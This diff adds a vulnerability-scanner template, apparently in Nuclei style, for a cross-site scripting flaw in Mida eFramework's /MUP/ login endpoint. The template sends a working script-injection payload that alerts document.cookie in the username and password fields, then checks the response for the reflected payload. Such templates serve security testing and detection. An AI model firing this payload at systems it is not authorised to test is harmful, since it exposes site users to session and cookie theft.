@@ -1,0 +1,29 @@
+id: mida-eframework-xss
+brief:
+    title: Mida eFramework - Cross-Site Scripting
+    by: pikpikcu
+    level: high
+    about: Mida eFramework contains a cross-site scripting vulnerability. An attacker can execute arbitrary script in the browser of an unsuspecting user in the context of the affected site. This can allow th...
+    label:
+        - mida
+        - xss
+        - edb
+        - vuln
+    score: CVSS:7.2
+moves:
+    - verb: POST
+      to:
+        - '{{BaseURL}}/MUP/'
+      head:
+        Content-Type: application/x-www-form-urlencoded
+        Referer: '{{Hostname}}/MUP'
+      body: UPusername=%22%3E%3Cscript%3Ejavascript%3Aalert%28document.cookie%29%3C%2Fscript%3E&UPpassword=%22%3E%3Cscript%3Ejavascript%3Aalert%28document.cookie%29%3C%2Fscript%3E
+      signs:
+        - "on": status
+          status:
+            - 200
+        - "on": word
+          has:
+            - '"><script>javascript:alert(document.cookie)</script>'
+          in: body
+          need: all
